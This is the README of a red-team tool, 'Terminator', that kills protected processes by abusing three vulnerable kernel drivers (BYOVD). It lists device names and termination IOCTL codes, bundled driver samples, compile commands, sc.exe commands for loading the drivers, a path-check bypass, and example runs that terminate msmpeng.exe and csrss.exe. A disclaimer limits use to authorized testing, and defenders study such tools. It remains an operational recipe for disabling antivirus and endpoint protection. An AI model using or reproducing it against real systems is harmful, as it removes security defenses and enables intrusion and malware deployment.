# Terminator - Red Team Process Killer

A collection of kernel-mode process termination tools leveraging vulnerable drivers (BYOVD) to kill protected processes from user mode.

## Project Structure

| File | Description |
|------|-------------|
| `terminator.hpp` | Shared class interface for process enumeration and termination |
| `terminator_STProcessMonitorDriver.cpp` | Exploit for STProcessMonitorDriver (IOCTL 0xB822200C) |
| `Terminator_libwasys.cpp` | Exploit for libwasys.sys (IOCTL 0x22E00C) |
| `terminator_MonProcessControl.cpp` | Exploit for MonProcessControl.sys (HONOR MagicSpaceTurbo, IOCTL 0x0022400C with path check bypass) |
| `terminator.cpp` | Original implementation |
| `ProcessMonitorDriver.sys` | STProcessMonitorDriver sample (included) |
| `ilbwasys.sys` / `libwasys.sys` | libwasys driver samples |

## Compilation

Requires MinGW-w64 (GCC) on Windows. Compile individual variants:

### STProcessMonitorDriver
```powershell
g++ --% src\terminator_STProcessMonitorDriver.cpp -o terminator_STProcessMonitor.exe -Oz -ffunction-sections -fdata-sections -static -static-libgcc -static-libstdc++ -Wl,--gc-sections -W
```

### libwasys.sys (WasysControl)
```powershell
g++ --% src\Terminator_libwasys.cpp -o terminator_libwasys.exe -Oz -ffunction-sections -fdata-sections -static -static-libgcc -static-libstdc++ -Wl,--gc-sections -W
```

### MonProcessControl.sys
```powershell
g++ --% src\terminator_MonProcessControl.cpp -o terminator_MonProcessControl.exe -Oz -ffunction-sections -fdata-sections -static -static-libgcc -static-libstdc++ -Wl,--gc-sections -W
```

Flags breakdown:
| Flag | Purpose |
|------|---------|
| `--%` | PowerShell stop-parsing token (passes args literally to g++) |
| `-Oz` | Optimize for minimum size |
| `-ffunction-sections` / `-fdata-sections` | Place each function/data in separate section |
| `-static` / `-static-libgcc` / `-static-libstdc++` | Static linking (no runtime DLL dependencies) |
| `-Wl,--gc-sections` | Linker garbage-collects unused sections |
| `-W` | Enable warnings |

Output: standalone executables (~20-30 KB stripped).

## Technical Focus

All variants share a common architecture:
- Enumerate running processes via `CreateToolhelp32Snapshot()` 
- Case-insensitively match target process names
- Continuously monitor for target processes (300ms interval)
- Send kernel-mode termination IOCTLs to vulnerable drivers

### Variants

| Variant | Driver Device | IOCTL | Input Size | Notes |
|---------|---------------|-------|------------|-------|
| STProcessMonitorDriver | `\\.\STProcessMonitorDriver` | `0xB822200C` | 8 bytes (ULONG64 PID) | CVE-2026-0828 related |
| libwasys.sys | `\\.\WasysControl` | `0x22E00C` | 4 bytes (DWORD PID) | Direct IOCTL |
| MonProcessControl.sys | `\\.\MonProcessControl` | `0x0022400C` | 4 bytes (DWORD PID) | Requires relocation to `C:\HONOR\MagicAnimation\MagicSpaceTurbo.exe` due to path check |

### Code Analysis

**`Terminator::GetProcessPids()`**
- Creates a snapshot via `CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)`
- Iterates all processes with `Process32First`/`Process32Next`
- Case-insensitive matches against target process names
- Returns vector of matching PIDs

**`Terminator::ProcessKill()`**
- Opens handle to the vulnerable driver device
- Enters infinite monitoring loop (300ms interval)
- For each discovered PID, sends the appropriate IOCTL
- Logs only on kill attempts

**`Relocate()` (MonProcessControl only)**
- Copies executable to `C:\HONOR\MagicAnimation\MagicSpaceTurbo.exe`
- Relaunches from there to bypass driver path validation
- Cleans up after execution

## Usage Guide

### Prerequisites

Load the appropriate vulnerable driver (requires Administrator):

```cmd
# STProcessMonitorDriver
sc.exe create STProcessMonitor type=kernel binPath=C:\Path\To\Driver\ProcessMonitorDriver.sys
sc.exe start STProcessMonitor

# libwasys.sys
sc.exe create WasysControl type=kernel binPath=C:\Path\To\Driver\libwasys.sys
sc.exe start WasysControl

# MonProcessControl.sys
sc.exe create MonProcessControl type=kernel binPath=C:\Path\To\Driver\MonProcessControl.sys
sc.exe start MonProcessControl
```

### Run Terminator

All variants use the same syntax:

```cmd
<terminator_exe> -proc <process_name1> [process_name2] ...
```

Examples:
```cmd
terminator_STProcessMonitor.exe -proc notepad.exe
terminator_libwasys.exe -proc msmpeng.exe csrss.exe
terminator_MonProcessControl.exe -proc antivirus.exe
```

### Output

```
[+] Connected to driver. Monitoring for processes...
[*] Sending IOCTL 0xB822200C to terminate PID 4188...
[+] Success! IOCTL sent for PID 4188.
```

For MonProcessControl, relocation messages appear first if not already in the expected path.

## Disclaimer

> **This tool is for authorized security research and red team exercises only.**
>
> Unauthorized use against systems you do not own or have explicit permission to test is illegal. The author assumes no liability for misuse. Ensure you have written authorization before deploying in any environment.
>
> The vulnerable drivers are intentionally flawed for demonstration purposes and should **never** be deployed in production.
